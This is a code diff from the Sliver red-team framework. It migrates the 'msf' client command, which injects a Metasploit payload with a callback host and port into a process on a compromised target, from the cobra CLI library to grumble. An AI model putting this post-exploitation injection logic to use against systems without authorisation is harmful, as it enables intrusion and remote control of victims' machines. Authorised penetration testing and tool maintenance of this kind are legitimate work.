@@ -25,22 +25,23 @@ import (
 	"github.com/bishopfox/sliver/client/console"
 	consts "github.com/bishopfox/sliver/client/constants"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
-	"github.com/spf13/cobra"
 	"google.golang.org/protobuf/proto"
+
+	"github.com/desertbit/grumble"
 )
 
-// MsfCmd - Inject a metasploit payload into the current remote process.
-func MsfCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
+// MsfCmd - Inject a metasploit payload into the current remote process
+func MsfCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	session, beacon := con.ActiveTarget.GetInteractive()
 	if session == nil && beacon == nil {
 		return
 	}
 
-	payloadName, _ := cmd.Flags().GetString("payload")
-	lhost, _ := cmd.Flags().GetString("lhost")
-	lport, _ := cmd.Flags().GetInt("lport")
-	encoder, _ := cmd.Flags().GetString("encoder")
-	iterations, _ := cmd.Flags().GetInt("iterations")
+	payloadName := ctx.Flags.String("payload")
+	lhost := ctx.Flags.String("lhost")
+	lport := ctx.Flags.Int("lport")
+	encoder := ctx.Flags.String("encoder")
+	iterations := ctx.Flags.Int("iterations")
 
 	if lhost == "" {
 		con.PrintErrorf("Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfStr)
@@ -61,7 +62,7 @@ func MsfCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 		payloadName, goos, goarch, lhost, lport)
 	con.SpinUntil(msg, ctrl)
 	msfTask, err := con.Rpc.Msf(context.Background(), &clientpb.MSFReq{
-		Request:    con.ActiveTarget.Request(cmd),
+		Request:    con.ActiveTarget.Request(ctx),
 		Payload:    payloadName,
 		LHost:      lhost,
 		LPort:      uint32(lport),
